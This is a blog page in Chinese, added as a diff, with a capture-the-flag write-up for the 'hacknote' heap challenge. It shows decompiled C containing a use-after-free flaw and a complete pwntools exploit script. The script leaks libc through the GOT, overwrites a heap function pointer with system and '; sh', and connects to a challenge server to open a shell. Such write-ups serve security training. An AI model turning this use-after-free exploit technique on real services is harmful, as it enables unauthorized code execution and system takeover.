@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>wp hacknote | I0gan</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="HackNote来源World of Attack &amp; Defense 难度4 &#x2F; 10 保护 12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x8048000)  简单描述相对比较简单的堆利用题目, 保护机制比较">
+<meta property="og:type" content="article">
+<meta property="og:title" content="wp hacknote">
+<meta property="og:url" content="http://blog.i0gan.cn/2020/04/08/wp-hacknote/index.html">
+<meta property="og:site_name" content="I0gan">
+<meta property="og:description" content="HackNote来源World of Attack &amp; Defense 难度4 &#x2F; 10 保护 12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x8048000)  简单描述相对比较简单的堆利用题目, 保护机制比较">
+<meta property="og:locale">
+<meta property="article:published_time" content="2020-04-08T13:23:10.000Z">
+<meta property="article:modified_time" content="2020-09-15T10:04:35.000Z">
+<meta property="article:author" content="i0gan">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="I0gan" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">I0gan</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.i0gan.cn"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-wp-hacknote" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/08/wp-hacknote/" class="article-date">
+  <time datetime="2020-04-08T13:23:10.000Z" itemprop="datePublished">2020-04-08</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/pwn/">pwn</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      wp hacknote
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="HackNote"><a href="#HackNote" class="headerlink" title="HackNote"></a>HackNote</h1><h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p>World of Attack &amp; Defense</p>
+<h2 id="难度"><a href="#难度" class="headerlink" title="难度"></a>难度</h2><p>4 / 10</p>
+<h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<h2 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h2><p>相对比较简单的堆利用题目, 保护机制比较少,涉及知识点也比较少…</p>
+<h2 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">rm</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= dword_804A04C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)ptr[v1] + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(ptr[v1]); <span class="comment">//释放后没有让指针数组清空</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);                            <span class="comment">// not set null</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line">... ...</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">//打印函数</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">puts_0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= dword_804A04C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ptr[v1] )</span><br><span class="line">     <span class="comment">//vul 可以在堆中修改实现控制eip</span></span><br><span class="line">    (*(<span class="keyword">void</span> (__cdecl **)(<span class="keyword">void</span> *))ptr[v1])(ptr[v1]); <span class="comment">//若没释放会调用 addputs函数</span></span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">addputs</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(a1 + <span class="number">4</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>堆的基本利用</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>使用UAF漏洞实现和在堆中调用指针函数漏洞来实现获取libc基址,获取system地址,再次使用UAF修改该指针打印调用system获得shell</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="获取libc基址"><a href="#获取libc基址" class="headerlink" title="获取libc基址"></a>获取libc基址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ad(<span class="number">0x10</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">ad(<span class="number">0x10</span>, <span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">rm(<span class="number">0</span>)</span><br><span class="line">rm(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">dump_addr = <span class="number">0x0804862B</span></span><br><span class="line">ad(<span class="number">0x8</span>, p32(dump_addr) + p32(exe.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">dp(<span class="number">0</span>)</span><br><span class="line">puts_addr = u32(r(<span class="number">4</span>))</span><br><span class="line">li(<span class="string">&#x27;puts_addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>通过修改函数指针为system获得shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get shell</span></span><br><span class="line">rm(<span class="number">2</span>)</span><br><span class="line">ad(<span class="number">0x8</span>, p32(sys_addr) + <span class="string">&#x27;; sh&#x27;</span>)</span><br><span class="line">dp(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"><span class="comment"># Team  : D0g3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = &#x27;konsole&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">exeFile  = <span class="string">&quot;hacknote&quot;</span></span><br><span class="line">libFile  = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;111.198.29.45&quot;</span></span><br><span class="line">remotePort = <span class="number">32693</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIB   = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">pd32  = <span class="keyword">lambda</span> x : p32(x).decode() <span class="comment">#python3 not surport str + bytes</span></span><br><span class="line">pd64  = <span class="keyword">lambda</span> x : p64(x).decode()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">size, text</span>):</span></span><br><span class="line">	sa(<span class="string">&#x27;Your choice :&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sa(<span class="string">&#x27;Note size :&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	sa(<span class="string">&#x27;Content :&#x27;</span>, text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">index</span>):</span></span><br><span class="line">	sa(<span class="string">&#x27;Your choice :&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dp</span>(<span class="params">index</span>):</span></span><br><span class="line">	sa(<span class="string">&#x27;Your choice :&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(index))	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sa(<span class="string">&#x27;Your choice :&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	<span class="comment">#li(rl())</span></span><br><span class="line">	ad(<span class="number">0x10</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">	ad(<span class="number">0x10</span>, <span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	rm(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	dump_addr = <span class="number">0x0804862B</span></span><br><span class="line">	ad(<span class="number">0x8</span>, p32(dump_addr) + p32(exe.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">	dp(<span class="number">0</span>)</span><br><span class="line">	puts_addr = u32(r(<span class="number">4</span>))</span><br><span class="line">	li(<span class="string">&#x27;puts_addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">	libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">	libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">	sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">	<span class="comment"># get shell</span></span><br><span class="line">	rm(<span class="number">2</span>)</span><br><span class="line">	ad(<span class="number">0x8</span>, p32(sys_addr) + <span class="string">&#x27;; sh&#x27;</span>)</span><br><span class="line">	dp(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.i0gan.cn/2020/04/08/wp-hacknote/" data-id="ckhemv82m002xwdcma3tnhp39" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/04/14/wp-babyheap/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          wp babyheap
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/04/08/wp-house-of-grey/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">wp house of grey</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/dev/">dev</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/docker/">docker</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/exploit/">exploit</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/golang/">golang</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/hexo/">hexo</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/life/">life</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/summary/">summary</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/vul/">vul</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/" rel="tag">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/awd/" rel="tag">awd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dev/" rel="tag">dev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/golang/" rel="tag">golang</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/life/" rel="tag">life</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/metasploit/" rel="tag">metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn-env/" rel="tag">pwn-env</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vul/" rel="tag">vul</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weekly-summary/" rel="tag">weekly summary</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/android/" style="font-size: 12.5px;">android</a> <a href="/tags/awd/" style="font-size: 10px;">awd</a> <a href="/tags/dev/" style="font-size: 10px;">dev</a> <a href="/tags/docker/" style="font-size: 12.5px;">docker</a> <a href="/tags/golang/" style="font-size: 10px;">golang</a> <a href="/tags/hexo/" style="font-size: 12.5px;">hexo</a> <a href="/tags/kernel/" style="font-size: 12.5px;">kernel</a> <a href="/tags/life/" style="font-size: 15px;">life</a> <a href="/tags/linux/" style="font-size: 17.5px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/pwn/" style="font-size: 12.5px;">pwn</a> <a href="/tags/pwn-env/" style="font-size: 10px;">pwn-env</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/vul/" style="font-size: 10px;">vul</a> <a href="/tags/weekly-summary/" style="font-size: 12.5px;">weekly summary</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/wp/" style="font-size: 20px;">wp</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/11/08/tiesan-2020/">tiesan-2020</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/08/wp-other/">wp-thb-2020</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/06/wp-nssc-2020/">wp-nssc-2020</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/01/weekly-report-3/">weekly-report-3</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/01/wp-xhb-2020/">湖湘杯2020</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 i0gan<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
